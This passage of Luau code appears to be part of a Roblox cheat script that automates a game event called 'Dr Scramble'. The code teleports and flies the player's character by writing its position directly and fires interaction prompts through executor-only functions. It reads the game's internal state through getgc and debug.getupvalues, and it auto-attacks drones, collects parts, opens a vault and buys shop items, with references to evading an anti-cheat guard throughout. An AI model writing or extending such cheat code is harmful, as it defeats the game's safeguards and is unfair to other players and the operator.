				position = flag5 and arg or position + n14.Unit * n15
				local vector2 = Vector3.new(n14.X, 0, n14.Z)
				local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or v11.CFrame.Rotation

				pcall(function()
					v11.CFrame = CFrame.new(position) * cframe
					v11.AssemblyLinearVelocity = Vector3.zero
					v11.AssemblyAngularVelocity = Vector3.zero
				end)

				if flag5 then
					flag4 = true
				end
			end)

			while flag4 == nil do
				RunService.Heartbeat:Wait()
			end

			connection:Disconnect()
			tbl4.Driving = math.max(0, tbl4.Driving - 1)
			tbl4.Shield("scramble", false)
			return flag4
		end

		fn18 = function(arg)
			if typeof(arg) ~= "Instance" or not arg:IsA("ProximityPrompt") then
				return false
			end

			local ok = pcall(function()
				arg:InputHoldBegin()
				local n10 = tonumber(type(tbl4.PromptHold) == "function" and tbl4.PromptHold(arg) or arg.HoldDuration) or 0

				if n10 > 0 then
					task.wait(n10 + 0.2)
				end

				arg:InputHoldEnd()
			end)

			if not ok and type(fireproximityprompt) == "function" then
				ok = pcall(fireproximityprompt, arg)
			end

			return ok
		end

		local function fn34()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("SecretZones")
			return world and world:FindFirstChild("Cave") or nil
		end

		fn19 = function(arg)
			local teleporter = fn34()
			teleporter = teleporter and teleporter:FindFirstChild("Teleporter")
			teleporter = teleporter and teleporter:FindFirstChild(arg)
			teleporter = teleporter and teleporter:FindFirstChild("SecretZonePrompt", true)
			return teleporter and teleporter:IsA("ProximityPrompt") and teleporter or nil
		end

		fn20 = function(arg, arg2)
			arg = arg and arg.Parent
			if arg and arg:IsA("Attachment") then
				return arg.WorldPosition
			end

			if arg and arg:IsA("BasePart") then
				return arg.Position
			end
			return arg2
		end

		fn21 = function()
			local v9 = fn16()
			if not v9 then
				return false
			end
			local position = v9.Position
			local vector2 = Vector3.new(position.X - vector.X, 0, position.Z - vector.Z)
			return position.Y < -60 and vector2.Magnitude < 160
		end

		local function fn35()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			world = world and world:FindFirstChild("SeparationLine")
			return world and world:IsA("BasePart") and world.Position.X or 552
		end

		fn22 = function(arg)
			if not arg then
				arg = fn16()
				arg = arg and arg.Position
			end

			return arg ~= nil and arg.X < fn35()
		end

		local connection = localPlayer.CharacterAdded:Connect(function()
			tbl4.ScrambleRespawned = true
			tbl14.Tool = nil
			tbl14.EquipAt = 0
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		fn23 = function(arg, arg2)
			if not fn22() then
				tbl4.ScrambleRespawned = false
				return true
			end

			if arg2 and fn22(arg2) then
				return true
			end

			local function fn36()
				str = "Respawned, resting in the safe zone"
				local n10 = os.clock() + 0.75

				while os.clock() < n10 do
					if arg() then
						return false
					end
					task.wait(0.1)
				end

				tbl4.ScrambleRespawned = false
				return true
			end

			local flag4 = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil
			if not flag4 then
				tbl4.ScrambleRespawned = false
				return true
			end
			local flag5 = tbl4.ScrambleRespawned == true

			if tbl4.DistanceTo(flag4) <= 12 then
				if flag5 then
					return (fn36())
				end
				return true
			end

			str = flag5 and "Respawned, easing out through the safe zone" or "Leaving the base through the safe zone"
			local v9 = fn17
			local v10 = v9(flag4 + Vector3.new(0, 3, 0), arg, 3, flag5 and math.min(400, 300) or nil)
			if v10 and flag5 then
				return (fn36())
			end
			return v10
		end

		local function fn36(arg, arg2, arg3)
			local v9 = fn16()
			if not v9 then
				return false
			end
			tbl4.Shield("scramblefly", true)
			local position = v9.Position
			local flag4 = true

			if Vector3.new(arg.X - position.X, 0, arg.Z - position.Z).Magnitude > 250 then
				local n10 = math.max(position.Y, arg.Y, 98)
				flag4 = fn17(Vector3.new(position.X, n10, position.Z), arg2, 2) and fn17(Vector3.new(arg.X, n10, arg.Z), arg2, 2)
			end

			flag4 = flag4 and fn17(arg, arg2, math.min(arg3, 2))
			tbl4.Shield("scramblefly", false)
			return flag4
		end

		local function fn37()
			local flag4 = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil
			return flag4 and flag4 + Vector3.new(0, 3, 0) or nil
		end

		fn24 = function(arg, arg2, arg3)
			local n10 = arg3 or 6
			if tbl4.DistanceTo(arg) <= n10 then
				return true
			end
			local v9 = fn22()
			local v10 = fn22(arg)

			if v9 and not v10 then
				if not fn23(arg2, arg) then
					return false
				end
			elseif v10 and not v9 then
				local v11 = fn37()

				if v11 and (v11 - arg).Magnitude > 12 and tbl4.DistanceTo(v11) > 12 then
					str = "Coming back through the safe zone"
					if not fn36(v11, arg2, 3) then
						return false
					end
				end
			end

			return fn36(arg, arg2, n10)
		end

		fn25 = function(arg)
			if fn22() or arg() or tbl4.IsNight() or tbl4.WallSealed() then
				return
			end
			local v9 = fn37()

			if v9 then
				str = "Coming back through the safe zone"
				fn24(v9, arg, 4)
			end
		end

		local function fn38(arg)
			if fn21() then
				return true
			end
			local Entry = fn19("Entry")
			local v9 = fn20(Entry, Vector3.new(2125.7, 73.1, -295.4))
			str = "Flying to the Secret Cave"
			if not fn24(v9, arg, 6) then
				return false
			end

			for i = 1, 4 do
				if arg() then
					return false
				end
				str = "Entering the Secret Cave"
				fn18(Entry or fn19("Entry"))
				local n10 = os.clock() + 1.5

				while os.clock() < n10 and not fn21() do
					RunService.Heartbeat:Wait()
				end

				if fn21() then
					return true
				end
			end

			str = "Cave door missed, flying in"
			local quest = type(snapshot) == "table" and snapshot.Quest or nil
			local position = type(quest) == "table" and type(quest.EscapedExperiment) == "table" and quest.EscapedExperiment.Position or nil

			if typeof(position) == "Vector3" then
				pcall(tbl4.FlyTo, position, arg, "scramble")
			end

			return fn21()
		end

		local function fn39(arg)
			local quest = type(snapshot) == "table" and snapshot.Quest or nil
			local flag4 = type(quest) == "table" and quest[arg] or nil
			local position = type(flag4) == "table" and flag4.Position or nil
			if typeof(position) == "Vector3" then
				return position
			end
			local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
			drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(arg)
			if drScrambleEvent and drScrambleEvent:IsA("Model") then
				return drScrambleEvent:GetPivot().Position
			end
			return nil
		end

		local function fn40(arg)
			local v9 = snapshot
			local interactions = type(v9) == "table" and v9.Interactions or nil
			return math.max(4, (type(interactions) == "table" and tonumber(interactions[arg]) or 12) - 4)
		end

		fn26 = function(arg)
			local v9 = fn10()
			if not v9 or v9.Discovered == true then
				return true
			end
			local EscapedExperiment = fn39("EscapedExperiment")
			if not EscapedExperiment or not fn38(arg) then
				return false
			end
			str = "Talking to the Escaped Experiment"
			if not fn17(EscapedExperiment, arg, fn40("NpcRadius")) then
				return false
			end
			local Discover = fn8("Discover")
			fn9(true)
			return Discover ~= nil and fn10() ~= nil and fn10().Discovered == true
		end

		fn27 = function(arg)
			local v9 = fn10()
			local flag4 = not v9 or v9.Completed == true
			local flag5

			if flag4 then
				flag5 = flag4
			else
				local n10 = #tbl10
				flag5 = fn14(v9) >= n10
			end

			if flag5 then
				return
			end

			if v9.Discovered ~= true and not fn26(arg) then
				return
			end

			for _, v10 in ipairs(tbl10) do
				if arg() then
					return
				end

				if not fn13(fn10(), v10) then
					local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
					drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(v10)
					drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild("Hitbox", true)
					local claimLostPart = drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
					local position = drScrambleEvent and drScrambleEvent:IsA("BasePart") and drScrambleEvent.Position or fn39(v10)

					if position then
						str = "Flying to " .. (v10 == "LostPart1" and "Lost Part 1" or "Lost Part 2")

						if fn24(position + Vector3.new(0, 2, 0), arg, 3) then
							str = "Collecting the lost part"
							local n10 = position + Vector3.new(0, 2.5, 0)
							local character = localPlayer.Character
							tbl4.Shield("scramble", true)
							tbl4.Driving = tbl4.Driving + 1

							local connection2 = RunService.Heartbeat:Connect(function()
								local v11 = tbl4.Root()
								if not v11 or v11.Parent ~= character or tbl4.AntiGuard.Busy or tbl4.Movement.Owner ~= "scramble" then
									return
								end

								pcall(function()
									local rotation = v11.CFrame.Rotation
									v11.CFrame = CFrame.new(n10) * rotation
									v11.AssemblyLinearVelocity = Vector3.zero
									v11.AssemblyAngularVelocity = Vector3.zero
								end)
							end)

							for i = 1, 4 do
								if not arg() then
									claimLostPart = claimLostPart or drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
									fn18(claimLostPart)
									task.wait(0.6)
									fn9(true)
									if not fn13(fn10(), v10) then
										continue
									end
								end

								break
							end

							connection2:Disconnect()
							tbl4.Driving = math.max(0, tbl4.Driving - 1)
							tbl4.Shield("scramble", false)
							if arg() then
								return
							end
							continue
						end
					end
				end
			end
		end

		fn28 = function(arg)
			local v9 = fn10()
			if not v9 or v9.Completed == true then
				return
			end
			local num = tonumber(v9.TotalParts)

			if not num then
				num = fn14(v9) + (tonumber(v9.DroneParts) or 0)
			end

			if num < 5 then
				return
			end
			local ExperimentVault = fn39("ExperimentVault")
			if not ExperimentVault or not fn38(arg) then
				return
			end
			str = "Opening the Experiment Vault"
			if not fn17(ExperimentVault, arg, fn40("VaultRadius")) then
				return
			end
			fn8("Vault")
			fn9(true)
			local v10 = fn10()

			if v10 and v10.Completed == true then
				str = "Vault opened, The Scrambler unlocked"
			end
		end

		fn29 = function()
			local function fn41(arg)
				if not arg or not arg:IsA("Tool") then
					return false
				end

				if tostring(arg:GetAttribute("ItemType")) ~= "MutationConsumable" then
					return false
				end
				local attribute = arg:GetAttribute("MutationId") or arg:GetAttribute("MutationTemplate")
				if attribute ~= nil then
					return tostring(attribute) == "Scrambled"
				end
				return string.find(string.lower(arg.Name), "scrambled", 1, true) ~= nil
			end

			local character = localPlayer.Character

			if character then
				for _, child in ipairs(character:GetChildren()) do
					if fn41(child) then
						return child, true
					end
				end
			end

			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if fn41(child) then
						return child, false
					end
				end
			end

			return nil, false
		end

		fn30 = function(arg, arg2)
			local shopPurchases = type(arg) == "table" and arg.ShopPurchases or nil
			local flag4 = type(shopPurchases) == "table" and shopPurchases[arg2.Id] or nil
			if type(flag4) ~= "table" then
				return 0
			end
			local shopPeriod = type(snapshot) == "table" and snapshot.ShopPeriod or nil
			if flag4.Period ~= nil and shopPeriod ~= nil and flag4.Period ~= shopPeriod then
				return 0
			end
			return tonumber(flag4.Count) or 0
		end

		fn31 = function(arg)
			local v9 = fn9(true)
			if type(v9) ~= "table" or type(v9.Shop) ~= "table" then
				return
			end

			for _, v10 in ipairs(tbl11) do
				if arg() then
					return
				end

				if tbl18[v10.Label] == true then
					for i = 1, 10 do
						local v11 = snapshot
						local v12 = fn10()
						local v13 = ipairs
						local shop = type(v11) == "table" and v11.Shop or {}
						local v14 = nil

						for _, v15 in v13(shop) do
							if type(v15) == "table" and v15.Id == v10.Id then
								v14 = v15
							end
						end

						if not (not v14 or not v12 or arg()) then
							local num = tonumber(v14.PurchaseLimit)

							if not (num and fn30(v12, v14) >= num) then
								if not ((tonumber(v12.Samples) or 0) - (tonumber(v14.Price) or math.huge) < n4) then
									local Shop = fn8("Shop", v14.Id, { Quote = v14.Quote, Sequence = tonumber(v12.ShopSequence) or 0 })

									if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
										str = "Bought " .. v10.Label
										task.wait(0.4)
										continue
									end
								end
							end
						end

						break
					end
				end
			end
		end
	end

	local n10, n11, n12, tbl17, tbl18, v9, n13, n14, fn32, v10
	local fn33, fn34, fn35, fn36

	do
		local n15 = 98
		n10 = 12
		n11 = 20
		n12 = 3

		tbl17 = {
			Vector3.new(2000, 90, -360),
			Vector3.new(2700, 90, -370),
			Vector3.new(3400, 90, -365),
			Vector3.new(4100, 90, -360),
			Vector3.new(4800, 90, -370),
			Vector3.new(5500, 90, -360),
			Vector3.new(5900, 90, -365),
		}

		tbl18 = {}
		local tbl19 = { Link = nil, Goal = nil, Look = nil, Character = nil }
		local userId = localPlayer.UserId
		local tbl20 = {}

		for _, v11 in ipairs({
			{ Label = "Scrap Drone", Tier = "ScrapDrone" },
			{ Label = "Reactor Drone", Tier = "ReactorDrone" },
			{ Label = "Augmented Drone", Tier = "AugmentedDrone" },
		}) do
			tbl20[#tbl20 + 1] = v11.Label
		end

		local tbl21 = { ScrapDrone = true, ReactorDrone = true, AugmentedDrone = true }
		local v11 = ({ "Nearest", "Rare First", "Most HP First" })[1]
		v9 = ({ "Tween", "Teleport" })[1]
		n13 = 110
		n14 = 1.5
		local n16 = 0
		local n17 = -math.huge

		local function fn37(arg)
			local num = type(arg) == "table" and tonumber(arg.OwnerUserId) or nil
			return num == nil or num == userId
		end

		local function fn38(arg)
			if typeof(arg) == "CFrame" then
				return arg.Position
			end

			if typeof(arg) == "Vector3" then
				return arg
			end
			return nil
		end

		local function fn39(arg, arg2)
			local v12 = networking:FindFirstChild(arg)
			if not v12 or not v12:IsA("RemoteEvent") then
				return
			end

			local connection = v12.OnClientEvent:Connect(function(...)
				pcall(arg2, ...)
			end)

			fn4(function()
				pcall(function()
					connection:Disconnect()
				end)
			end)
		end

		fn39("RE/Scramble/Drones", function(arg)
			if type(arg) ~= "table" then
				return
			end
			local v12 = pairs
			local upserts = type(arg.Upserts) == "table" and arg.Upserts or {}

			for _, upsert in v12(upserts) do
				if type(upsert) == "table" and upsert.Id ~= nil and fn37(upsert) then
					local id = tostring(upsert.Id)
					local attributes = type(upsert.Attributes) == "table" and upsert.Attributes or {}
					local tbl22 = tbl12[id] or {}
					tbl22.Id = id
					tbl22.Position = fn38(upsert.CFrame) or tbl22.Position
					tbl22.Health = tonumber(upsert.Health) or tbl22.Health or 1
					tbl22.Tier = tostring(attributes.ScrambleTier or tbl22.Tier or "")
					tbl22.Area = tostring(attributes.ScrambleArea or tbl22.Area or "")
					tbl22.Seen = os.clock()
					tbl12[id] = tbl22
				end
			end

			local v13 = pairs
			local removed = type(arg.Removed) == "table" and arg.Removed or {}

			for k, v14 in v13(removed) do
				local v15 = tbl12
				local v16 = tostring
				v14 = type(v14) == "string" and v14
				k = v14 or k
				v15[v16(k)] = nil
			end
		end)

		fn39("RE/Scramble/Effect", function(arg, arg2, arg3)
			if arg ~= "Hit" or type(arg3) ~= "table" or arg3.DroneId == nil then
				return
			end
			local v12 = tbl12[tostring(arg3.DroneId)]
			if not v12 then
				return
			end
			v12.Position = fn38(arg2) or v12.Position
			v12.Health = (tonumber(v12.Health) or 1) - (tonumber(arg3.Amount) or 1)

			if type(arg3.Motion) == "string" and string.find(arg3.Motion, "\"Death\"", 1, true) then
				v12.Health = 0
			end

			if v12.Health <= 0 then
				tbl12[v12.Id] = nil
			end
		end)

		fn39("RE/Scramble/Drops", function(arg)
			local v12 = pairs
			arg = type(arg) == "table" and arg or {}

			for _, v13 in v12(arg) do
				if type(v13) == "table" and v13.Id ~= nil and fn37(v13) then
					local v14 = fn38(v13.Position) or fn38(v13.Origin)

					if v14 then
						tbl13[tostring(v13.Id)] = {
							Position = v14,
							Radius = tonumber(v13.Radius) or 6,
							ExpiresAt = tonumber(v13.ExpiresAt),
							Kind = v13.Kind,
						}
					end
				end
			end
		end)

		fn39("RE/Scramble/State", function(arg)
			if type(arg) ~= "table" then
				return
			end

			if arg.Patch == true and type(snapshot) == "table" then
				for k, v12 in pairs(arg) do
					if k ~= "Patch" then
						snapshot[k] = v12
					end
				end
			elseif type(arg.State) == "table" then
				snapshot = arg
			end

			n5 = os.clock()
		end)

		fn39("RE/Scramble/RemoveDrops", function(arg)
			local v12 = pairs
			arg = type(arg) == "table" and arg or {}

			for k, v13 in v12(arg) do
				local v14 = tbl13
				local v15 = tostring
				v13 = type(v13) == "string" and v13 or k
				v14[v15(v13)] = nil
			end
		end)

		local function fn40(arg)
			local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
			return scrambleLocalVisuals and scrambleLocalVisuals:FindFirstChild("PersonalDrone_" .. arg) or nil
		end

		local v12 = nil
		local n18 = 0

		local function fn41()
			if v12 and next(v12) ~= nil then
				return v12
			end
			v12 = nil
			if os.clock() < n18 or type(getgc) ~= "function" or not fn12() then
				return nil
			end
			n18 = os.clock() + 15

			for _, v13 in ipairs(getgc(false)) do
				if type(v13) == "function" and islclosure(v13) then
					local ok, result = pcall(debug.info, v13, "s")

					if ok and type(result) == "string" and string.find(result, "PersonalDrones", 1, true) then
						local ok2, result2 = pcall(debug.getupvalues, v13)

						if ok2 and type(result2) == "table" then
							for _, v14 in pairs(result2) do
								if type(v14) == "table" then
									local key, v15 = next(v14)
									if type(v15) == "table" and v15.OwnerUserId ~= nil and v15.CFrame ~= nil then
										v12 = v14
										return v14
									end
								end
							end

							continue
						end
					end
				end
			end

			return nil
		end

		local function fn42()
			local v13 = fn41()
			if not v13 then
				return
			end

			for k, v14 in pairs(v13) do
				if type(v14) == "table" and fn37(v14) then
					local str3 = tostring(v14.Id or k)
					local attributes = type(v14.Attributes) == "table" and v14.Attributes or {}
					local tbl22 = tbl12[str3]
					local health = tonumber(v14.Health)

					if not tbl22 then
						tbl22 = { Id = str3 }
						health = health or 1
						tbl22.Health = health
						tbl12[str3] = tbl22
					elseif health then
						tbl22.Health = math.min(health, tonumber(tbl22.Health) or health)
					end

					tbl22.Position = fn38(v14.CFrame) or tbl22.Position
					tbl22.Tier = tostring(attributes.ScrambleTier or tbl22.Tier or "")
					tbl22.Area = tostring(attributes.ScrambleArea or tbl22.Area or "")

					if attributes.DroneState == "Death" then
						tbl22.Health = 0
					end
				end
			end

			for k in pairs(tbl12) do
				if v13[k] == nil then
					tbl12[k] = nil
				end
			end
		end

		local function fn43()
			pcall(fn42)
			local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
			if not scrambleLocalVisuals then
				return
			end

			for _, child in ipairs(scrambleLocalVisuals:GetChildren()) do
				local attribute = child:GetAttribute("ScrambleDroneId")

				if child:IsA("Model") and attribute ~= nil and string.sub(child.Name, 1, 14) == "PersonalDrone_" then
					local str3 = tostring(attribute)

					if child:GetAttribute("DroneState") == "Death" then
						tbl12[str3] = nil
					elseif not tbl12[str3] then
						local ok, result = pcall(child.GetPivot, child)

						tbl12[str3] = {
							Id = str3,
							Position = ok and result.Position or nil,
							Health = tonumber(child:GetAttribute("Health")) or 1,
							Tier = tostring(child:GetAttribute("ScrambleTier") or ""),
							Area = tostring(child:GetAttribute("ScrambleArea") or ""),
							Seen = os.clock(),
						}
					end
				end
			end
		end

		local function fn44(arg)
			local v13 = fn40(arg.Id)
			local hitbox = v13 and v13:FindFirstChild("Hitbox")
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox.Position
			end

			if v13 and v13.PrimaryPart then
				return v13.PrimaryPart.Position
			end
			return arg.Position
		end

		local function fn45()
			local tbl22 = {}
			local now = os.clock()

			for k, v13 in pairs(tbl12) do
				local flag4 = v13.Tier == nil or v13.Tier == "" or tbl21[v13.Tier] == true

				if flag4 then
					flag4 = (tonumber(v13.Health) or 0) > 0
				end

				flag4 = flag4 and v13.Position
				local flag5

				if flag4 then
					flag5 = (tbl18[k] or 0) <= now
				else
					flag5 = flag4
				end

				if flag5 then
					tbl22[#tbl22 + 1] = v13
				end
			end

			return tbl22
		end

		local function fn46()
			local v13 = fn16()
			if not v13 then
				return nil
			end
			local huge = math.huge
			local v14 = nil

			for _, v15 in ipairs(fn45()) do
				local magnitude = ((fn44(v15) or v15.Position) - v13.Position).Magnitude
				local v16 = v11

				if v16 == "Rare First" then
					if v15.Tier == "AugmentedDrone" then
						magnitude -= 200000
					elseif v15.Tier == "ReactorDrone" then
						magnitude -= 100000
					end
				elseif v16 == "Most HP First" then
					magnitude -= (tonumber(v15.Health) or 0) * 100000
				end

				if magnitude < huge then
					huge = magnitude
					v14 = v15
				end
			end

			return v14
		end

		local function fn47()
			local v13 = fn16()
			if not v13 then
				return nil, nil
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local huge = math.huge
			local v14 = nil
			local v15 = nil

			for k, v16 in pairs(tbl13) do
				if v16.ExpiresAt and v16.ExpiresAt < serverTimeNow then
					tbl13[k] = nil
				else
					local magnitude = (v16.Position - v13.Position).Magnitude

					if v16.Kind == "Part" then
						magnitude -= 100000
					end

					if magnitude < huge then
						huge = magnitude
						v14 = k
						v15 = v16
					end
				end
			end

			return v14, v15
		end

		fn32 = function()
			if not tbl19.Link then
				if tbl19.SwapWait then
					tbl19.SwapWait = nil
					tbl4.Shield("scramble", false)
				end

				return
			end

			tbl19.Link:Disconnect()
			local v13 = tbl19
			local v14 = tbl19
			local v15 = tbl19
			tbl19.Link = nil
			v13.Goal = nil
			v14.Look = nil
			v15.Character = nil
			local v16 = tbl19
			local v17 = tbl19
			local v18 = tbl19
			local v19 = tbl19
			tbl19.Track = nil
			v16.Dir = nil
			v17.Last = nil
			v18.LastAt = nil
			v19.Vel = nil
			tbl4.Driving = math.max(0, tbl4.Driving - 1)
			tbl4.Shield("scramble", false)
		end

		fn4(fn32)

		local function fn48(goal, look, track)
			if track ~= tbl19.Track then
				local v13 = tbl19
				local v14 = tbl19
				tbl19.Last = nil
				v13.LastAt = nil
				v14.Vel = nil
			end

			local v13 = tbl19
			local v14 = tbl19
			tbl19.Goal = goal
			v13.Look = look
			v14.Track = track
			local character = localPlayer.Character

			if tbl19.Link and tbl19.Character ~= character then
				fn32()
				local v15 = tbl19
				local v16 = tbl19
				tbl19.Goal = goal
				v15.Look = look
				v16.Track = track
			end

			if tbl19.Link or not character then
				return
			end

			if not tbl4.Swapped() then
				tbl4.Shield("scramble", true)
				tbl19.SwapWait = tbl19.SwapWait or os.clock() + 6
				local swapWait = tbl19.SwapWait
				if os.clock() < swapWait then
					str = "Waiting for the character to settle"
					return
				end
			end

			if tbl19.SwapWait then
				tbl19.SwapWait = nil
			else
				tbl4.Shield("scramble", true)
			end

			tbl19.Character = character
			tbl4.Driving = tbl4.Driving + 1

			tbl19.Link = RunService.Heartbeat:Connect(function(deltaTime)
				local v15 = tbl4.Root()
				local goal2 = tbl19.Goal
				if not v15 or not goal2 or v15.Parent ~= tbl19.Character or tbl4.AntiGuard.Busy or tbl4.Movement.Owner ~= "scramble" then
					return
				end
				local position = v15.Position

				if tbl19.Track then
					local ok, last = pcall(tbl19.Track)

					if ok and typeof(last) == "Vector3" then
						local now = os.clock()

						if not tbl19.Last or not tbl19.LastAt then
							local v16 = tbl19
							tbl19.Last = last
							v16.LastAt = now
						elseif (last - tbl19.Last).Magnitude > 0.01 then
							local n19 = math.max(now - tbl19.LastAt, 0.0041666666666666666)
							local n20 = (last - tbl19.Last) / n19

							if n20.Magnitude < 400 then
								local n21 = math.clamp(n19 * 12, 0.2, 0.8)
								tbl19.Vel = tbl19.Vel and tbl19.Vel:Lerp(n20, n21) or n20
							end

							local v16 = tbl19
							tbl19.Last = last
							v16.LastAt = now
						elseif now - tbl19.LastAt > 0.25 and tbl19.Vel then
							tbl19.Vel = tbl19.Vel:Lerp(Vector3.zero, math.clamp(deltaTime * 6, 0, 1))
						end

						local vel = tbl19.Vel or Vector3.zero
						local look2 = tbl19.Last + vel * (math.clamp(now - tbl19.LastAt, 0, 0.25) + 0.1)
						local vector = Vector3.new(position.X - look2.X, 0, position.Z - look2.Z)

						if vector.Magnitude > 0.5 then
							local unit = vector.Unit
							local n19 = math.clamp(deltaTime * 5, 0, 1)
							local dir = tbl19.Dir and tbl19.Dir:Lerp(unit, n19) or unit
							tbl19.Dir = dir.Magnitude > 0.01 and dir.Unit or unit
						end

						goal2 = look2 + (tbl19.Dir or Vector3.new(0, 0, 1)) * n8 + Vector3.new(0, -1, 0)
						local v16 = tbl19
						tbl19.Goal = goal2
						v16.Look = look2

						if (goal2 - position).Magnitude <= 40 then
							local n19 = math.max(deltaTime, 0.0041666666666666666)
							local n20 = vel + (goal2 - position) / math.max(0.1, n19)
							local n21 = math.max(400, vel.Magnitude + 80)

							if n21 < n20.Magnitude then
								n20 = n20.Unit * n21
							end

							local assemblyLinearVelocity = n20 + Vector3.new(0, workspace.Gravity * n19 * 0.5, 0)
							local vector2 = Vector3.new(look2.X - position.X, 0, look2.Z - position.Z)

							pcall(function()
								if vector2.Magnitude > 0.05 then
									v15.CFrame = CFrame.lookAt(position, position + vector2.Unit)
								end

								v15.AssemblyLinearVelocity = assemblyLinearVelocity
								v15.AssemblyAngularVelocity = Vector3.zero
							end)

							return
						end
					end
				end

				local vector

				if not (Vector3.new(goal2.X - position.X, 0, goal2.Z - position.Z).Magnitude > 250) then
					vector = goal2
				else
					local n19 = math.max(n15, goal2.Y)
					vector = position.Y < n19 - 2 and Vector3.new(position.X, n19, position.Z) or Vector3.new(goal2.X, n19, goal2.Z)
				end

				local n19 = vector - position
				local n20 = n3 * deltaTime
				local n21 = n19.Magnitude <= n20 and vector or position + n19.Unit * n20
				local look2 = tbl19.Look or goal2
				local vector2 = Vector3.new(look2.X - n21.X, 0, look2.Z - n21.Z)
				local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or v15.CFrame.Rotation

				pcall(function()
					v15.CFrame = CFrame.new(n21) * cframe
					v15.AssemblyLinearVelocity = Vector3.zero
					v15.AssemblyAngularVelocity = Vector3.zero
				end)
			end)
		end

		local function fn49(arg)
			if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
				return false
			end
			local attribute = arg:GetAttribute("GearName")
			local gears = tbl.Gears
			local directory = type(gears) == "table" and gears.Directory or nil
			local flag4 = type(attribute) == "string" and type(directory) == "table" and directory[attribute] or nil
			return type(flag4) == "table" and (flag4.ToolController == "Slap" or flag4.SlapPower ~= nil)
		end

		local function fn50(arg)
			if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
				return false
			end

			if tostring(arg:GetAttribute("ItemType")) ~= "Gear" then
				return false
			end
			local str3 = tostring(arg:GetAttribute("GearName") or "")
			if str3 == "" then
				return false
			end
			return string.find(string.lower(str3), "scrambler", 1, true) ~= nil
		end

		local function fn51()
			return localPlayer.Character, localPlayer:FindFirstChildOfClass("Backpack")
		end

		local function fn52()
			local v13 = tbl4.FindBat()
			if v13 then
				return v13
			end
			local v14, v15 = fn51()

			for _, v16 in ipairs({ v14, v15 }) do
				if v16 then
					for _, child in ipairs(v16:GetChildren()) do
						if fn49(child) or fn50(child) then
							return child
						end
					end
				end
			end

			return nil
		end

		tbl14.Valid = function(arg)
			if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
				return false
			end
			return tbl4.IsBatTool(arg) or fn49(arg) or fn50(arg)
		end

		tbl14.Owned = function(arg)
			if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
				return false
			end
			local v13, v14 = fn51()
			local parent = arg.Parent
			return parent ~= nil and (parent == v13 or parent == v14)
		end

		tbl14.Name = function(arg)
			if fn50(arg) then
				return "The Scrambler"
			end
			return tostring(arg:GetAttribute("GearName") or arg.Name)
		end

		tbl14.Put = function(arg, arg2, parent)
			local equipAt = tbl14.EquipAt
			if os.clock() - equipAt < 0.4 then
				return false
			end
			tbl14.EquipAt = os.clock()

			pcall(function()
				arg2:EquipTool(arg)
			end)

			if arg.Parent ~= parent then
				pcall(function()
					arg.Parent = parent
				end)
			end

			return arg.Parent == parent
		end

		local function fn53()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
			if not character or not humanoid or humanoid.Health <= 0 then
				return nil, false
			end
			local tool = character:FindFirstChildWhichIsA("Tool")

			if tool ~= nil and tbl14.Valid(tool) then
				tbl14.Tool = tool
				str2 = tbl14.Name(tool)
				return tool, true
			end

			if not tbl14.Owned(tbl14.Tool) then
				tbl14.Tool = fn52()
			end

			local tool2 = tbl14.Tool
			if not tool2 then
				str2 = ""
				return nil, false
			end
			str2 = tbl14.Name(tool2)
			tbl14.Put(tool2, humanoid, character)
			return tool2, tool2.Parent == character
		end

		local function fn54()
			local v13, v14 = fn53()

			if v13 and v14 then
				if flag2 then
					pcall(function()
						v13:Activate()
					end)

					task.defer(function()
						pcall(function()
							v13:Deactivate()
						end)
					end)
				else
					pcall(function()
						v13:Deactivate()
						v13:Activate()
					end)
				end
			end

			return v13 ~= nil
		end

		local function fn55()
			local v13, v14 = fn51()
			local v15 = nil
			local v16 = nil
			local v17 = nil

			for _, v18 in ipairs({ v13, v14 }) do
				if v18 then
					for _, child in ipairs(v18:GetChildren()) do
						if tbl14.Valid(child) then
							if fn50(child) then
								v15 = v15 or child
							elseif tbl4.IsBatTool(child) and (v16 == nil or not tbl4.IsBatTool(v16)) then
								if v17 then
									v16 = child
								else
									v17 = v16
									v16 = child
								end
							elseif v16 == nil then
								v16 = child
							elseif v17 == nil then
								v17 = child
							end
						end
					end
				end
			end

			return v16, v15 or v17
		end

		local function fn56(arg)
			pcall(function()
				arg:Activate()
			end)

			task.defer(function()
				pcall(function()
					arg:Deactivate()
				end)
			end)
		end

		tbl15.SpamUntil = 0
		tbl15.List = {}
		tbl15.Dirty = true
		tbl15.BuiltAt = 0
		tbl15.NextBag = 0
		tbl15.Links = {}

		tbl15.Click = function(arg)
			pcall(arg.Deactivate, arg)
			pcall(arg.Activate, arg)
		end

		tbl15.Rebuild = function()
			tbl15.Dirty = false
			tbl15.BuiltAt = os.clock()
			table.clear(tbl15.List)
			local v13, v14 = fn51()

			for _, v15 in ipairs({ v13, v14 }) do
				if v15 then
					for _, child in ipairs(v15:GetChildren()) do
						if tbl14.Valid(child) then
